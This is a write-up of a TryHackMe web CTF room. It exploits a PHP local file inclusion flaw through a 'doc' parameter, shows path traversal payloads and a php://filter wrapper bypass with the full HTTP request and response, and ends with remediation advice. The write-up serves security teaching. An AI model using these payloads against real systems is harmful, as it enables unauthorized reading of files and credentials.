**Room:** [TryHackMe — CTF: Jackpot Overflow](https://tryhackme.com/room/thm-ctf-jackpot-overflow)

**Category:** Web **Difficulty:** Easy **Points:** 60 **Tags:** OWASP, LFI, PHP Wrappers, Black Box **Flag:** _submitted on TryHackMe — omitted here_

---

## Challenge Description

> The house always keeps a back room, and this one never quite closed its doors. Somewhere behind the neon and the noise sits a forgotten terminal, still quietly serving up files to anyone who knows how to ask nicely.
> 
> Word on the floor is the old system trusts its visitors a little too much. Find the door, learn its language, and see what the dealer never meant to hand over.

Hints in the flavour text: _"the usual tricks don't land here"_, _"try more than the obvious"_, _"rewards patience and experimentation"_. This signals a file inclusion that has some kind of extension/path whitelist in place — requiring a bypass.

---

## 1. Reconnaissance

Visiting `http://TARGET` presents a web application. The URL structure quickly reveals a `doc` parameter used to load content:

```
http://TARGET/?doc=<something>
```

This is a classic **Local File Inclusion (LFI)** entry point — the server reads a file from disk based on user input and returns its contents.

---

## 2. Testing the Obvious — and Why It Fails

The most common LFI payload is a direct path traversal:

```
/?doc=/var/www/flag.txt
/?doc=../../../../../../etc/passwd
```

These likely fail because the application enforces a **whitelist** — probably checking that the value of `doc` ends in a permitted extension (e.g. `.html`, `.txt`) or starts with a permitted directory. The challenge hint about _"usual tricks not landing"_ confirms some filter is in place.

---

## 3. PHP Stream Wrappers — the Bypass

PHP exposes a set of built-in **stream wrappers** that can be used in any function that opens a file (`include()`, `file_get_contents()`, `fopen()`, etc.). The key one here is:

```
php://filter/resource=<path>
```

`php://filter` is a meta-wrapper that lets you apply transformations to a stream before it is returned. Even with **no** filter chain specified (just `resource=`), it still opens and returns the file — but crucially, it **bypasses extension and path checks** that the application may apply to plain string values, because the input now looks like a PHP protocol URI rather than a raw file path.

Other common wrappers (`file://`, `php://input`, `data://`) can achieve similar effects in different scenarios. The flavour text hint _"learn its language"_ is a nudge toward PHP-specific internals.

---

## 4. Exploitation

**Request:**

http

```http
GET /?doc=php://filter/resource=/var/www/flag.txt HTTP/1.1
Host: TARGET
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: keep-alive
```

The wrapper syntax tells PHP:

- Use the `php://filter` stream
- Apply **no transformations** (no `convert.*` or `string.*` filter is specified)
- Open the resource at `/var/www/flag.txt` and return it raw

**Response:**

http

```http
HTTP/1.1 200 OK
Server: Apache/2.4.58 (Ubuntu)
Content-Disposition: inline; filename="flag.txt"
Content-Length: 33
Content-Type: application/octet-stream

[flag omitted]
```

The server returns the file contents directly, bypassing whatever whitelist was blocking the plain path.

---

## 5. Flag

_submitted on TryHackMe — omitted here_

---

## Vulnerability Summary

|Item|Detail|
|---|---|
|**Vulnerability class**|Local File Inclusion (LFI) via PHP stream wrapper|
|**Root cause**|User-controlled `doc` parameter passed to a PHP file-open function without sanitising PHP protocol URIs|
|**Bypass technique**|`php://filter/resource=` — wraps the target path in a PHP stream URI, evading extension/directory whitelists|
|**Impact**|Arbitrary local file read (flag, source code, `/etc/passwd`, credentials, etc.)|
|**OWASP reference**|A01:2021 – Broken Access Control / A03:2021 – Injection|

## Remediation

- **Never** pass user input directly to file-opening functions (`include`, `require`, `file_get_contents`, `fopen`, etc.).
- If a doc-viewer pattern is required, map user-supplied identifiers to server-side paths using an allowlist lookup table (e.g. `'home' => '/var/www/html/home.html'`) so the user never controls the actual filesystem path.
- Disable dangerous PHP wrappers via `php.ini` where not needed (`allow_url_fopen = Off`, `allow_url_include = Off`).
- Run the application under a restricted user with minimal filesystem permissions.